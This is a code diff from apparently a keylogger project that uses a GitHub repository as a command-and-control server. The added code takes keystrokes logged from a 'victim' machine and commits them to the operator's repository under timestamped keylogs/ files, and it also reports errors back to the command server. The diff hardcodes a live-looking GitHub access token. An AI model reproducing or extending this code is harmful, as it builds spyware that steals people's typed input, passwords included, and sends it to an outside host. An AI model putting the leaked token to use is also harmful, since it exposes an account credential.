@@ -27,7 +27,7 @@ def setup_communication_with_github_repo() -> GitHubRepo:
         owner = "Alishah634",
         repo = "HID_Command_Control_Server",
         # Use a classic token not a fine grained one!
-        token = "", # Hardcode belongs to Ali (BAD PRACTICE!!!)
+        token = "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", # Hardcode belongs to Ali (BAD PRACTICE!!!)
     )
 
     # Read commits:
@@ -140,18 +140,47 @@ if __name__ == "__main__":
             keystrokes_to_extract = handler.extract_logged_keys(source = "memory", limit = None)
 
             # If no keystorkes to default to Logging, just set that we cant extract:
-            # TODO:: Ideally we should inform the command server of this decision by:
+            # TODO:: Ideally we should inform the command server of this decision by::q
+            #
             # updating mode.txt and increment the ack.txt:
             if not keystrokes_to_extract: 
                 can_extract = False
+                print("There were no keys to extract...", file=sys.stderr)
+                git.add("error.txt", f"Previous ACK Number at Control Server: {repo.prev_ack_number}\nCurrent ACK Number at Control Server: {repo.ack_number}.\nError Message: {error_message}")
+                git.commit_and_push(f"Error when reading keys to extract from Victim/Control to Command server!!!")
                 continue
 
             if can_extract:
-                with open("temp_log.txt", "w") as f:
-                    for keystroke in keystrokes_to_extract:
-                        f.write(f"{token}\n")
-                pass
+                """
+                Take a list of keystrokes (strings) and push them as a single file
+                under keylogs/ on the GitHub repo using the GitLike API.
+                """
+                print("There ARE keys to extract...", file=sys.stderr)
+                error_message = None
+                try:
+                    # Writing IO Bad Idea:
+                    keystrokes_file_content= "".join( keystrokes_to_extract)
 
+                    # 1. Build file content (one keystroke per line)
+                    file_content = "\n".join(keystrokes_to_extract) + "\n"
+
+                    # 2. Choose a remote path like: keylogs/keys_2025-12-10_01-23-45.txt
+                    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
+                    remote_path = f"keylogs/keys_{timestamp}.txt"
+
+                    if not token:
+                        print("GITHUB_TOKEN not set; cannot push to GitHub",file=sys.stderr)
+
+                    # 3. Stage the file and commit+push
+                    git.add(remote_path, file_content)
+                    commit_sha = git.commit_and_push(f"Upload keystroke log {timestamp}")
+
+                    print(f"[GitHub] Uploaded {remote_path} in commit {commit_sha}")
+                except Exception as e:
+                    error_message = f"{e}"
+                    if error_message is not None: # Relay there was an issue in setting the mode!
+                        git.add("error.txt", f"Previous ACK Number at Control Server: {repo.prev_ack_number}\nCurrent ACK Number at Control Server: {repo.ack_number}.\nError Message: {error_message}")
+                        git.commit_and_push(f"Error Detected when extracting keys from Victim/Control to Command server!!!")
 
         else:
             # Call key loggin function:
